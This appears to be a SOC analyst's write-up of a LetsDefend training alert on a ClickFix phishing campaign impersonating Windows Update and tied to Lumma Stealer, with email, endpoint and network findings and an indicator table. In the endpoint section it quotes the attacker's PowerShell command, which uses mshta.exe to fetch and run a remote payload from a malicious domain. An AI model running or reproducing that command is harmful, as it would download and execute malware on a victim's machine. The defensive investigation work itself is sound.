# SOC338 – Lumma Stealer ClickFix Phishing

**Platform:** LetsDefend  
**Severity:** Critical  
**Classification:** True Positive  
**Date:** March 13, 2025

## Summary

Investigated a phishing campaign impersonating Microsoft Windows Update. The victim was redirected to a malicious website that used ClickFix instructions to trick the user into executing a PowerShell command.
<img width="1574" height="547" alt="338-01-alert" src="https://github.com/user-attachments/assets/61a9f5b3-0b6c-4ebc-aecb-e02591db73f3" />

## Investigation

### 1. Email Analysis

Identified a phishing email from `update@windows-update.site` targeting `dylan@letsdefend.io`. The email directed the victim to `windows-update.site`, which VirusTotal flagged as malicious (10/93 vendors).

<img width="1919" height="974" alt="338-02-alert" src="https://github.com/user-attachments/assets/96ab61b3-b3bb-4db5-9693-f5d132d081d2" />





### 2. Endpoint Analysis

Investigated workstation `172.16.17.216`. Process and terminal logs revealed PowerShell launching `mshta.exe` to access a suspicious remote payload.

    powershell.exe -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"



### 3. Network Analysis

Correlated `mshta.exe` (PID 7284) with an allowed HTTPS connection to `172.67.139.19:443`. Firewall logs confirmed the requested URL matched the suspicious PowerShell command.

## Indicators of Compromise

| Type | Indicator |
|---|---|
| Phishing Domain | `windows-update.site` |
| Payload Domain | `overcoatpassably.shop` |
| Destination IP | `172.67.139.19` |
| Suspicious File | `maloy.mp4` |
| Process | `mshta.exe` (PID 7284) |

## Conclusion

**True Positive.** Confirmed malicious command execution and an allowed connection to malware delivery infrastructure. Successful Lumma Stealer execution, C2 communication, and data exfiltration were not confirmed.

**MITRE ATT&CK:** T1566, T1204, T1059.001, T1218.005
